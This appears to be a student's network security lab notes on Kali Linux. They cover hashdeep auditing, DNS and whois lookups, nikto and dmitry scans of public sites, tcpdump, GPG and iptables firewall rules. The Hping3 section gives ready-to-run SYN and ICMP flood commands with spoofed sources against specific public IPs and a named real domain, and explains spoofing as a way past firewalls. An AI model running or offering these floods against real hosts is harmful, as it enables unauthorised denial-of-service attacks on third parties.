@@ -1,0 +1,216 @@
+//  Hashing n auditing using Hashdeep tool in Kali Linux //
+sudo su
+//Then enter password of the machine //
+
+mkdir <directory_name>
+ls //to list the files//
+
+cd directory_name 
+pwd/home/user/directory_name
+
+hashdeep -c md5 -r /home/user/directory_name/desktop>xyz.txt
+run the above command again
+
+hashdeep -a -r -k xyz.txt /home/user/desktop
+Audit passed will be notified
+
+hashdeep -a -r -k xyz.txt /home/user/desktop
+Audit failed will be notified
+
+/////////////////////////////////////////////
+----whois 
+
+whois codehelp.com
+
+----traceroute
+
+sudo apt install traceroute
+traceroute youtube.com or facebook.com or google.com etc
+traceroute <any ipv4 address> 
+//for e.g.//
+traceroute 172.217.14.238
+
+traceroot google.com
+
+----dig
+
+sudo apt install dnsutils
+
+dig google.com
+dig google.com ANY
+
+dig -x <ip address> 
+//for e.g.//
+dig -x 172.217.14.238
+
+dig +noall +answer -x 172.217.14.238  
+
+---- nslookup
+
+nslookup youtube.com
+nslookup   -type=ns [youtube.com]
+nslookup -type=ns youtube.com
+
+sudo apt install dnsutils -y
+
+nslookup 192.168.0.10
+nslookup -type=ns  [google.com]
+nslookup -type=ns google.com
+
+-----nikto------
+
+sudo apt install nikto -y
+nikto -h youtube.com
+nikto -h tsec.edu
+
+----dmitry---
+dmitry -w google.com
+
+sudo apt install git
+cd desktop/ cd downloads
+git clone https://github.com/jaygreig86/dmitry.git
+
+dmitry -winespo example.txt google.com
+sudo apt install dmitry
+
+
+/////////////////////////////////////////////
+
+TCPDUMP:
+
+sudo apt-get install tcpdump
+
+tcpdump -D: all interface
+
+tcpdump -n
+
+tcpdump -n tcp
+
+tcpdump -n -v -e
+
+tcpdump -n src 10.0.2.15 /dst
+
+tcpdump -n port 80
+
+tcpdump udp and src port 53
+
+tcpdump -n portrange 1-80
+
+tcpdump -n src port 443
+
+
+
+
+////////////////////////////////////////////////////
+GPG:
+
+1. gpg --gen-key or gpg –full-generate-key (repeat for sender and receiver)
+
+2. gpg --export -a username>filename (creates file in ascii format)
+
+3. gpg --export-secret-key -a username>filename (for sender)
+
+4. gpg --fingerprint receiver’s_email (for receiver)
+
+5. gpg --import filename_containing_public_key_of_receiver
+
+6. gpg --list-keys
+
+7. gpg --sign-key receiver_email
+
+8. gpg --encrypt -r receiver_email name_of_file (only encrypt, .gpg file created)
+
+9. gpg -o myfiledecrypted -d myfile.txt.gpg
+
+
+///////////////////////////////////////////////////////
+
+Hping3
+
+1. sudo apt install hping3 -y
+
+///
+A simple DOS (not DDOS) attack would be:
+
+2. sudo hping3 -S --flood -V -p 80 170.155.9.185
+
+sudo: gives needed privileges to run hping3. 
+hping3: calls hping3 program. 
+-S: specifies SYN packets. 
+–flood: replies will be ignored and packets will be sent as fast as possible. 
+-V: Verbosity. 
+-p 80: port 80 
+-170.155.9.185: target IP.
+
+Flood Using SYN Packets Against Port 80 SYN packets include the connection synchronization confirmation request. The following example shows a SYN attack against lacampora.org:
+
+eg: sudo hping3 lacampora.org -q -n -d 120 -S -p 80 --flood --rand-source
+
+///
+Flood From a Fake IP Address With hping3 With hping3 you can also attack your targets with a fake IP. In order to bypass a firewall, you can even clone your target IP itself, or any allowed address you may know (you can achieve it for example with Nmap or a sniffer to listen to established connections).
+
+The syntax is the following:
+
+2. sudo hping3 -a <FAKE IP> <target> -S -q -p 80
+In the example below, I replaced my real IP address with the IP 190.0.174.10.
+
+sudo hping3 -a 190.0.174.10 190.0.175.100 -S -q -p 80
+
+
+///
+Syn flood : hping3 -c 15000 -d 120 -S -w 64 -p 80 --flood --rand-source 192.168.1.159 
+ICMP flood: hping3 -1 --flood -a 192.168.103 192.168.1.255
+
+
+
+////////////////////////////////////////////////////////
+
+AIM: To study and configure Firewalls using IP tables
+
+A firewall is a system designed to prevent unauthorized access to or from a private network. 
+You can implement a firewall in either hardware or software form, or a combination of both. 
+Generally the firewall has two network interfaces: one for the external side of the network, 
+one for the internal side. Its purpose is to control what traffic is allowed to traverse from one 
+side to the other. As the most basic level, firewalls can block traffic intended for particular 
+IP addresses or server ports.
+
+Types of Firewalls
+Three basic types of network firewalls: packet filtering (stateless), stateful, and application 
+layer.
+Packet filtering, or stateless, firewalls work by inspecting individual packets in isolation. 
+As such, they are unaware of connection state and can only allow or deny packets based on 
+individual packet headers.
+Stateful firewalls are able to determine the connection state of packets, which makes them 
+much more flexible than stateless firewalls. They work by collecting related packets until 
+the connection state can be determined before any firewall rules are applied to the traffic.
+Application firewalls go one step further by analyzing the data being transmitted, which 
+allows network traffic to be matched against firewall rules that are specific to individual 
+services or applications. These are also known as proxy-based firewalls.
+
+sudo iptables -L
+(-L - List the current filter rules. )
+
+sudo iptables -A INPUT -p tcp --dport ssh -j ACCEPT
+sudo iptables -A INPUT -p tcp --dport 80 -j ACCEPT  
+sudo iptables -A INPUT -j DROP
+sudo iptables -L
+sudo iptables -I INPUT 1 -i lo -j ACCEPT
+sudo iptables -L
+sudo iptables -L -v
+
+Allow traffic on ICMP port
+sudo iptables -A INPUT -p icmp -j ACCEPT
+now list the rules again..
+sudo iptables -L
+
+Dropping icmp packets
+try to ping ur neighbour machine
+ping 192.168.92.17
+u can see the response packets received.
+Now block incoming icmp packets from the neighbour using command:
+sudo iptables -A INPUT -p icmp -j DROP
+list the rule:
+sudo iptables -L
+try to ping ur neighbour machine again
+ping 192.168.92.17
+u can not see receive icmp echo reply packets..
